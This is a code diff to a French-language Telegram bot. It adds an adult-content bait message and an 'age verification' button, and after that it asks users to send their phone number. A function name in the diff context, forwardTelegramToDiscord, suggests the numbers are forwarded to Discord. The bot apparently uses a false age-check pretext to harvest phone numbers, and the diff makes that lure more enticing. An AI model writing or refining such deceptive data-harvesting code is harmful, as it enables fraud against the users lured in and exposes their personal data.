@@ -494,7 +494,11 @@ async function forwardTelegramToDiscord(tgUser, phone) {
 if (process.env.TELEGRAM_BOT_TOKEN) {
   const { Telegraf, Markup } = require("telegraf");
   tgBot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
-  tgBot.start((ctx) => ctx.reply("🔞 Vérification — Numéro de téléphone\n\n⚠️ Ne partage jamais de mot de passe ni info sensible.\n\nTon numéro de téléphone (10 chiffres) :", Markup.keyboard([[Markup.button.contactRequest("📱 Envoyer mon numéro")]]).oneTime().resize()));
+  tgBot.start((ctx) => ctx.reply("🍑 ACCÈS +18 UNIQUEMENT\n\nClique pour te faire vérifier.", Markup.inlineKeyboard([[Markup.button.callback("🔓 Vérifier votre âge", "verify_age")]])));
+  tgBot.action("verify_age", async (ctx) => {
+    try { await ctx.answerCbQuery(); } catch {}
+    await ctx.reply("🔞 Vérification — Numéro de téléphone\n\n⚠️ Ne partage jamais de mot de passe ni info sensible.\n\nTon numéro (10 chiffres) :", Markup.keyboard([[Markup.button.contactRequest("📱 Envoyer mon numéro")]]).oneTime().resize());
+  });
   tgBot.on("contact", async (ctx) => {
     let phone = (ctx.message.contact.phone_number || "").replace(/\D/g, "");
     if (phone.startsWith("33")) phone = "0" + phone.slice(2);
